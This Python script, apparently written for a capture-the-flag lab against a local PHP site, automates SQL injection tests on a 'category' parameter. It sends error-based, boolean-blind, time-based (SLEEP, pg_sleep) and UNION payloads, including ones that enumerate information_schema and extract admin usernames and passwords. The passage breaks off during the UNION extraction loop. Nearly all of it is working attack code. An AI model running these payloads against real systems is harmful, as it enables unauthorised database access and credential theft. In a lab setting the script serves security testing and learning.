import requests
import time

# Target configuration
target_url = "http://127.0.0.1:33164/index.php"
cookies = {"PHPSESSID": "8993d695eb127fdc823416d1f8ee85ae"}
headers = {"User-Agent": "Mozilla/5.0"}

print("SQL Injection Testing - Category Parameter")
print("="*70)

# Get baseline response
try:
    r = requests.get(target_url, params={"category": "Nature"}, cookies=cookies, headers=headers, timeout=10)
    baseline_len = len(r.text)
    baseline_status = r.status_code
    print(f"[BASELINE] category=Nature -> Status: {baseline_status}, Length: {baseline_len}B")
except Exception as e:
    print(f"[ERROR] Cannot connect: {e}")
    exit(1)

# Test 1: Error-based injection
print("\n[TEST 1] Error-based SQL injection...")
error_tests = [
    "Nature' OR '1'='1--",
    "Nature' UNION SELECT 1,2,3,4,5--",
    "Tech' UNION SELECT @@version--",
    "Science' UNION SELECT database()--"
]

for payload in error_tests:
    try:
        r = requests.get(target_url, params={"category": payload}, cookies=cookies, headers=headers, timeout=10)
        length = len(r.text)
        diff = length - baseline_len
        
        print(f"\nPayload: {payload}")
        print(f"  Status: {r.status_code}, Length: {length}B (diff: {diff:+d}B)")
        
        # Check for SQL errors
        if any(err in r.text.lower() for err in ["sql", "error", "syntax", "mysql", "postgresql"]):
            print(f"  [SQL ERROR DETECTED] {r.text[:300]}")
        elif length > baseline_len + 100:
            print(f"  [DATA EXTRACTED] {r.text[:500]}")
        elif "FLAG{" in r.text:
            flag_start = r.text.find("FLAG{")
            flag_end = r.text.find("}", flag_start)
            print(f"  [FLAG FOUND] {r.text[flag_start:flag_end+1]}")
    except Exception as e:
        print(f"  Error: {str(e)[:50]}")

# Test 2: Boolean-based blind injection
print("\n[TEST 2] Boolean-based blind injection...")
true_payload = "Nature' AND 1=1--"
false_payload = "Nature' AND 1=2--"

try:
    r_true = requests.get(target_url, params={"category": true_payload}, cookies=cookies, headers=headers, timeout=10)
    r_false = requests.get(target_url, params={"category": false_payload}, cookies=cookies, headers=headers, timeout=10)
    
    len_true = len(r_true.text)
    len_false = len(r_false.text)
    
    print(f"True payload:  {true_payload} -> {len_true}B")
    print(f"False payload: {false_payload} -> {len_false}B")
    
    if len_true != len_false:
        print(f"[BOOLEAN INJECTION DETECTED] Diff: {abs(len_true-len_false)}B")
    else:
        print("[No boolean injection detected]")
except Exception as e:
    print(f"Error: {str(e)[:50]}")

# Test 3: Time-based blind injection
print("\n[TEST 3] Time-based blind injection...")
sleep_payloads = ["Nature' AND SLEEP(5)--", "Nature' AND pg_sleep(5)--"]

for payload in sleep_payloads:
    try:
        start = time.time()
        r = requests.get(target_url, params={"category": payload}, cookies=cookies, headers=headers, timeout=20)
        elapsed = time.time() - start
        
        print(f"Payload: {payload}")
        print(f"  Time elapsed: {elapsed:.2f}s")
        
        if elapsed > 4.5:
            print(f"  [TIME DELAY DETECTED - INJECTION POSSIBLE]")
        else:
            print(f"  [No significant delay]")
    except requests.exceptions.Timeout:
        print(f"  [TIMEOUT - Possible time-based injection]")
    except Exception as e:
        print(f"  Error: {str(e)[:50]}")

# Test 4: Data extraction via UNION
print("\n[TEST 4] UNION-based data extraction...")
union_tests = [
    "Nature' UNION SELECT table_name FROM information_schema.tables LIMIT 3--",
    "Nature' UNION SELECT column_name FROM information_schema.columns WHERE table_name='admins' LIMIT 3--",
    "Nature' UNION SELECT concat(username,':',password) FROM admins LIMIT 2--"
]

for payload in union_tests:
    try:
        r = requests.get(target_url, params={"category": payload}, cookies=cookies, headers=headers, timeout=15)
        length = len(r.text)
